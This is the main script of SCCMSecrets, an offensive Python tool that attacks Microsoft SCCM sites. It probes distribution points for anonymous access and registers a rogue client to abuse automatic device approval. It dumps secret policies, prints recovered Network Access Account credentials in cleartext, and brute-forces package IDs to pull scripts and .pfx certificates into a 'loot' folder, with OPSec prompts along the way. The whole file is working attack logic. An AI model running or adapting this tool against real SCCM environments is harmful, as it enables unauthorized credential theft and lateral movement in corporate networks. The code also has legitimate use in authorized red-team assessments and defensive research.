import os
import json
import typer
import base64
import logging
import requests
import traceback

from datetime                           import datetime
from time                               import sleep
from typing                             import List
from typing_extensions                  import Annotated
from cryptography.hazmat.primitives     import serialization

from utils.packageDownloadUtils         import checkAnonymousDPConnectionEnabled, retrieveSiteCode, packageScriptDownload
from utils.clientRegistrationUtils      import clientRegistration
from utils.policiesUtils                import secretPolicyProcess, policiesRequest, secretPolicyProcess
from conf                               import bcolors, ANONYMOUSDP, SCENARIOS

logger = logging.getLogger(__name__)


def print_banner():
    banner = """
 _____ _____  _____ ___  ___ _____                    _       
/  ___/  __ \/  __ \|  \/  |/  ___|                  | |      
\ `--.| /  \/| /  \/| .  . |\ `--.  ___  ___ _ __ ___| |_ ___ 
 `--. \ |    | |    | |\/| | `--. \/ _ \/ __| '__/ _ \ __/ __|
/\__/ / \__/\| \__/\| |  | |/\__/ /  __/ (__| | |  __/ |_\__ \\
\____/ \____/ \____/\_|  |_/\____/ \___|\___|_|  \___|\__|___/
 -------------------------------------------------------------
    """
    logger.warning(banner)


def main(
    distribution_point: Annotated[str, typer.Option(help="The target distribution point")],
    client_name: Annotated[str, typer.Option(help="The name of the client that will be created in SCCM. An FQDN is expected (e.g. fake.corp.com)")] = None,
    management_point: Annotated[str, typer.Option(help="The client's management point. Only necessary if the management point is not on the same machine as the distribution point.")] = None,
    bruteforce_range: Annotated[int, typer.Option(help="The number of package ID to bruteforce when performing anonymous policies scripts dump. Between 0 (00000) and 1048575 (FFFFF)")] = 4095,
    extensions: Annotated[str, typer.Option(help="Comma-separated list of extension that will determine which files will be downloaded when retrieving packages scripts")] = '.ps1, .bat, .xml, .txt, .pfx',
    username: Annotated[str, typer.Option(help="The username for a domain account (can be a user account, or - preferably - a machine acount)")] = None,
    password: Annotated[str, typer.Option(help="The password for a domain account (can be a user account, or - preferably - a machine account)")] = None,
    registration_sleep: Annotated[int, typer.Option(help="The amount of time, in seconds, that should be waited after registrating a new device. A few minutes is recommended so that the new device can be added to device collections (3 minutes by default, may need to be increased)")] = 180,
    use_existing_device: Annotated[str, typer.Option(help="This option can be used to re-run SCCMSecrets.py using a previously registered device ; or to impersonate a legitimate SCCM client. In both cases, it expects the path of a folder containing a guid.txt file (the SCCM device GUID) and the key.pem file (the client's private key).")] = None,
    verbose: Annotated[bool, typer.Option("--verbose", help="Enable verbose output")] = False
):
    ### ============================== ###
    ### Print banner, handle verbosity ###
    ### ============================== ###
    print_banner()
    if verbose is False: logging.basicConfig(format='%(message)s', level=logging.WARN)
    else: logging.basicConfig(format='%(message)s', level=logging.INFO)
    

    ### ===================================== ###
    ### Arguments format and coherence checks ###
    ### ===================================== ###
    if not distribution_point.startswith('http://'): distribution_point = f'http://{distribution_point}'
    if distribution_point.endswith('/'): distribution_point = distribution_point[:-1]
    if management_point is None: management_point = distribution_point
    else:
        if not management_point.startswith('http://'): management_point = f'http://{management_point}'
        if management_point.endswith('/'): management_point = management_point[:-1]
    if bruteforce_range < 0 or bruteforce_range > 1048575:
        logger.error(f"[-]{bcolors.FAIL}Invalid bruteforce range.{bcolors.ENDC}")
        return
    extensions = [x.strip() for x in extensions.split(',')]

    site_code = retrieveSiteCode(management_point)
    if not site_code:
        logger.warning(f"Could not retrieve site code. Exiting.")
        return
    anonymousDPConnectionEnabled = checkAnonymousDPConnectionEnabled(distribution_point)

    if username is None or password is None:
        credentialsProvided = False
        machineAccountProvided = False
    else:
        credentialsProvided = True
        if username.endswith('$'):
            machineAccountProvided = True
        else:
            machineAccountProvided = False
    

    ### ============================================= ###
    ### Loading existing device information if needed ###
    ### ============================================= ###
    if use_existing_device is not None:
        try:
            if use_existing_device.endswith('/'): use_existing_device = use_existing_device[:-1]
            with open(f'{use_existing_device}/key.pem', 'rb') as f:
                key_data = f.read()
            private_key = serialization.load_pem_private_key(key_data, password=None)

            with open(f'{use_existing_device}/guid.txt', 'r') as f:
                client_guid = f.read().strip()
            
        except:
            traceback.print_exc()
            logger.error(f"{bcolors.FAIL} [-] Error while loading existing device information.{bcolors.ENDC}")
            return


    ### ========================= ###
    ### Output directory creation ###
    ### ========================= ###
    if not os.path.exists('loot'):
        os.makedirs('loot')
    directory_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    os.makedirs(f"loot/{directory_name}")

    
    ### ============================== ###
    ### Displaying context information ###
    ### ============================== ###
    logger.warning("\n")
    logger.warning(f"##### Context information #####\n")
    lines = []

    if anonymousDPConnectionEnabled == ANONYMOUSDP.ENABLED.value:
        lines.append(f" - Anonymous Distribution Point access: {bcolors.OKGREEN}{bcolors.BOLD}[VULNERABLE]{bcolors.ENDC} Distribution point allows anonymous access{bcolors.ENDC}")
    elif anonymousDPConnectionEnabled == ANONYMOUSDP.DISABLED.value:
        lines.append(f" - Anonymous Distribution Point access: {bcolors.FAIL}{bcolors.BOLD}[NOT VULNERABLE]{bcolors.ENDC} (distribution point does not allow anonymous access)")
    else:
        lines.append(f" - Anonymous Distribution Point access: {bcolors.FAIL}{bcolors.BOLD}[UNKNOWN]{bcolors.ENDC} Unexpected anonymous access check result{bcolors.ENDC}")

    if credentialsProvided is False:
        lines.append(f" - Credentials provided: {bcolors.BOLD}[NONE]{bcolors.ENDC} (no credentials provided)")
    elif machineAccountProvided is False:
        lines.append(f" - Credentials provided: {bcolors.BOLD}[DOMAIN USER]{bcolors.ENDC} (domain user credentials, but no machine account)")
    else:
        lines.append(f" - Credentials provided: {bcolors.BOLD}[MACHINE ACCOUNT]{bcolors.ENDC} (machine account credentials provided)")
    
    lines.append(f" - Distribution point: {distribution_point}")
    lines.append(f" - Management point: {management_point}")
    lines.append(f" - Site code: {bcolors.BOLD}{site_code}{bcolors.ENDC}")
    lines.append(f" - File extensions to retrieve: {extensions}")
    lines.append(f" - Package ID bruteforce range: {bruteforce_range}")
    lines.append(f" - Output directory: {bcolors.BOLD}./loot/{directory_name}{bcolors.ENDC}")
    split_lines = [line.split(':', 1) for line in lines]
    max_key_length = max(len(key.strip()) for key, value in split_lines)
    for key, value in split_lines:
        logger.warning(f"{key.strip():<{max_key_length}} : {value.strip()}")
    
    logger.warning("\n###############################")
    logger.warning("\n")


    ### ==================================================== ###
    ### Prompting information to user ; determining scenario ###
    ### ==================================================== ###
    if not credentialsProvided and anonymousDPConnectionEnabled != ANONYMOUSDP.ENABLED.value:
        info_msg = "No credentials were provided, and target distribution point does not accept anonymous access. In these conditions, we can:"
        if use_existing_device is None:
            info_msg += "\n> Try to register an SCCM client in order to exploit automatic device approval if it is configured on the SCCM site (this misconfiguration is not present by default). If successful, secret policies will be retrieved. If said policies contain NAA credentials, these will be used to download package files."
        else:
            info_msg += "\n> Try to use the provided device to dump secret policies. If said policies contain NAA credentials, these will be used to download package files."

        logger.warning(info_msg)

        if use_existing_device is None:
            register_client = typer.confirm("\nDo you want to attempt registering a client (OPSec consideration: we will not be able to remove the client afterwards) ?")
        else:
            register_client = False
            confirmation = typer.confirm (f"\nWe will be using the existing device with GUID {client_guid}. Proceed ?")
            if not confirmation:
                return
        scenario = SCENARIOS.NoCredsNoAnonymous.value

    elif not credentialsProvided and anonymousDPConnectionEnabled == ANONYMOUSDP.ENABLED.value:
        info_msg = "No credentials were provided, but target distribution point does accept anonymous access. In these conditions, we can:"
        if use_existing_device is None:
            info_msg += "\n> Try to register an SCCM client in order to exploit automatic device approval if it is configured on the SCCM site (this misconfiguration is not present by default). If successful, secret policies will be retrieved."
        else:
            info_msg += "\n> Try to use the provided device to dump secret policies."
        
        info_msg += "\n> Download package files with specified extensions."
        logger.warning(info_msg)

        if use_existing_device is None:
            register_client = typer.confirm("\nDo you want to attempt registering a client (OPSec consideration: we will not be able to remove the client afterwards) ? If no, package file download will still be performed.")
        else:
            register_client = False
            confirmation = typer.confirm (f"\nWe will be using the existing device with GUID {client_guid}. Proceed ?")
            if not confirmation:
                return
        scenario = SCENARIOS.NoCredsAnonymous.value

    elif credentialsProvided and not machineAccountProvided:
        info_msg = "Domain user account credentials were provided, but no machine account credentials. In these conditions, we can:"
        if use_existing_device is None:
            info_msg += "\n> Try to register an SCCM client in order to exploit automatic device approval if it is configured on the SCCM site (this misconfiguration is not present by default). If successful, secret policies will be retrieved."
        else:
            info_msg += "\n> Try to use the provided device to dump secret policies."
        
        info_msg += "\n> Download package files with specified extensions."
        logger.warning(info_msg)

        if use_existing_device is None:
            register_client = typer.confirm("\nDo you want to attempt registering a client (OPSec consideration: we will not be able to remove the client afterwards) ? If no, package file download will still be performed.")
        else:
            register_client = False
            confirmation = typer.confirm (f"\nWe will be using the existing device with GUID {client_guid}. Proceed ?")
            if not confirmation:
                return
        scenario = SCENARIOS.UserCreds.value
    
    elif machineAccountProvided:
        info_msg = "Machine account credentials provided. In these conditions, we can:"
        if use_existing_device is None:
            info_msg += "\n> Register an SCCM client to retrieve secret policies."
        else:
            info_msg += "\n> Try to use the provided device to retrieve secret policies"
        
        info_msg += "\n> Download package files with specified extensions."
        logger.warning(info_msg)
        
        if use_existing_device is None:
            register_client = typer.confirm("\nDo you want to attempt registering a client (OPSec consideration: we will not be able to remove the client afterwards) ? If no, package file download will still be performed.")
        else:
            register_client = False
            confirmation = typer.confirm (f"\nWe will be using the existing device with GUID {client_guid}. Proceed ?")
            if not confirmation:
                return
        scenario = SCENARIOS.MachineCreds.value

    else:
        logger.error("[-] Unknown scenario - this should not happen.")
        return

    if register_client is True and client_name is None:
        logger.error(f"{bcolors.FAIL}[-] Registering a client requires to provide the client_name argument.")
        return




    ### ============ ###
    ### Scenario n°1 ###
    ### ============ ###
    if scenario == SCENARIOS.NoCredsNoAnonymous.value:
        known_packages = []
        naa_username = None
        naa_password = None
        if register_client is True or use_existing_device is not None:
            if register_client is True:
                private_key, client_guid = clientRegistration(management_point, username, password, machineAccountProvided, client_name, directory_name)
                logger.warning(f"[*] Sleeping for {registration_sleep} seconds ...")
                sleep(registration_sleep)
            secret_policies = policiesRequest(management_point, private_key, client_guid, client_name, directory_name)
            if len(secret_policies.keys()) > 0:
                if use_existing_device is None:
                    logger.warning(f"{bcolors.OKGREEN}{bcolors.BOLD}[+] We retrieved some secret policies, which indicates that the target site is vulnerable to automatic device approval.{bcolors.ENDC}")
                for key, value in secret_policies.items():
                    try:
                        result = secretPolicyProcess(key, value, private_key, client_guid, directory_name)
                        known_packages.extend(result['known_packages'])
                        if result["NAA_credentials"] is not None:
                            naa_username = result['NAA_credentials']["NetworkAccessUsername"].split('\\')[1][:-1]
                            naa_password = result['NAA_credentials']["NetworkAccessPassword"][:-1]
                            logger.warning(f"{bcolors.OKGREEN}[+] Retrieved NAA account credentials: {bcolors.BOLD}'{result['NAA_credentials']['NetworkAccessUsername']}:{result['NAA_credentials']['NetworkAccessPassword']}'{bcolors.ENDC}")
                            logger.warning(f"[*] We will try to use these credentials to dump package scripts from distribution point ...")
                    except Exception as e:
                        logger.warning(f"{bcolors.FAIL}[-] Encountered an error when trying to process secret policy.{bcolors.ENDC}")
                        traceback.print_exc()
                
                if naa_username is not None and naa_password is not None:
                    packageScriptDownload(distribution_point, site_code, bruteforce_range, extensions, directory_name, known_packages, anonymous=False, username=naa_username, password=naa_password)
            
            else:
                logger.warning(f"{bcolors.FAIL}[-] Could not retrieve any secret policies. Automatic device approval may not be enabled on target site.{bcolors.ENDC}")


    ### ============ ###
    ### Scenario n°2 ###
    ### ============ ###
    if scenario == SCENARIOS.NoCredsAnonymous.value:
        known_packages = []
        if register_client is True or use_existing_device is not None:
            if register_client is True:
                private_key, client_guid = clientRegistration(management_point, username, password, machineAccountProvided, client_name, directory_name)
                logger.warning(f"[*] Sleeping for {registration_sleep} seconds ...")
                sleep(registration_sleep)
            secret_policies = policiesRequest(management_point, private_key, client_guid, client_name, directory_name)
            if len(secret_policies.keys()) > 0:
                if use_existing_device is None:
                    logger.warning(f"{bcolors.OKGREEN}{bcolors.BOLD}[+] We retrieved some secret policies, which indicates that the target site is vulnerable to automatic device approval.{bcolors.ENDC}")
                for key, value in secret_policies.items():
                    try:
                        result = secretPolicyProcess(key, value, private_key, client_guid, directory_name)
                        known_packages.extend(result['known_packages'])
                        if result["NAA_credentials"] is not None:
                            logger.warning(f"{bcolors.OKGREEN}[+] Retrieved NAA account credentials: {bcolors.BOLD}'{result['NAA_credentials']['NetworkAccessUsername']}:{result['NAA_credentials']['NetworkAccessPassword']}'{bcolors.ENDC}")
                    except Exception as e:
                        logger.warning(f"{bcolors.FAIL}[-] Encountered an error when trying to process secret policy.{bcolors.ENDC}")
                        traceback.print_exc()

            else:
                logger.warning(f"{bcolors.FAIL}[-] Could not retrieve any secret policies. Automatic device approval may not be enabled on target site.{bcolors.ENDC}")
        packageScriptDownload(distribution_point, site_code, bruteforce_range, extensions, directory_name, known_packages, anonymous=True, username=None, password=None)


    ### ============ ###
    ### Scenario n°3 ###
    ### ============ ###
    if scenario == SCENARIOS.UserCreds.value:
        known_packages = []
        if register_client is True or use_existing_device is not None:
            if register_client is True:
                private_key, client_guid = clientRegistration(management_point, username, password, machineAccountProvided, client_name, directory_name)
                logger.warning(f"[*] Sleeping for {registration_sleep} seconds ...")
                sleep(registration_sleep)
            secret_policies = policiesRequest(management_point, private_key, client_guid, client_name, directory_name)
            if len(secret_policies.keys()) > 0:
                if use_existing_device is None:
                    logger.warning(f"{bcolors.OKGREEN}{bcolors.BOLD}[+] We retrieved some secret policies, which indicates that the target site is vulnerable to automatic device approval.{bcolors.ENDC}")
                for key, value in secret_policies.items():
                    try:
                        result = secretPolicyProcess(key, value, private_key, client_guid, directory_name)
                        known_packages.extend(result['known_packages'])
                        if result['NAA_credentials'] is not None:
                            logger.warning(f"{bcolors.OKGREEN}[+] Retrieved NAA account credentials: {bcolors.BOLD}'{result['NAA_credentials']['NetworkAccessUsername']}:{result['NAA_credentials']['NetworkAccessPassword']}'{bcolors.ENDC}")
                    except Exception as e:
                        logger.warning(f"{bcolors.FAIL}[-] Encountered an error when trying to process secret policy.{bcolors.ENDC}")
                        traceback.print_exc()

            else:
                logger.warning(f"{bcolors.FAIL}[-] Could not retrieve any secret policies. Automatic device approval may not be enabled on target site, or device is not approved.{bcolors.ENDC}")
        if anonymousDPConnectionEnabled  == ANONYMOUSDP.ENABLED.value:
            packageScriptDownload(distribution_point, site_code, bruteforce_range, extensions, directory_name, known_packages, anonymous=True, username=None, password=None)
        else:
            packageScriptDownload(distribution_point, site_code, bruteforce_range, extensions, directory_name, known_packages, anonymous=False, username=username, password=password)


    ### ============ ###
    ### Scenario n°4 ###
    ### ============ ###
    if scenario == SCENARIOS.MachineCreds.value:
        known_packages = []
        if register_client is True or use_existing_device is not None:
            if register_client is True:
                private_key, client_guid = clientRegistration(management_point, username, password, machineAccountProvided, client_name, directory_name)
                logger.warning(f"[*] Sleeping for {registration_sleep} seconds ...")
                sleep(registration_sleep)
            secret_policies = policiesRequest(management_point, private_key, client_guid, client_name, directory_name)
            if len(secret_policies.keys()) > 0:
                for key, value in secret_policies.items():
                    try:
                        result = secretPolicyProcess(key, value, private_key, client_guid, directory_name)
                        known_packages.extend(result['known_packages'])
                        if result['NAA_credentials'] is not None:
                            logger.warning(f"{bcolors.OKGREEN}[+] Retrieved NAA account credentials: {bcolors.BOLD}'{result['NAA_credentials']['NetworkAccessUsername']}:{result['NAA_credentials']['NetworkAccessPassword']}'{bcolors.ENDC}")
                    except Exception as e:
                        logger.warning(f"{bcolors.FAIL}[-] Encountered an error when trying to process secret policy.{bcolors.ENDC}")
                        traceback.print_exc()

        if anonymousDPConnectionEnabled  == ANONYMOUSDP.ENABLED.value:
            packageScriptDownload(distribution_point, site_code, bruteforce_range, extensions, directory_name, known_packages, anonymous=True, username=None, password=None)
        else:
            packageScriptDownload(distribution_point, site_code, bruteforce_range, extensions, directory_name, known_packages, anonymous=False, username=username, password=password)
    
    
    logger.warning(f"[*] All done. Bye !")
    

def entrypoint():
    typer.run(main)

    
if __name__ == "__main__":
    typer.run(main)
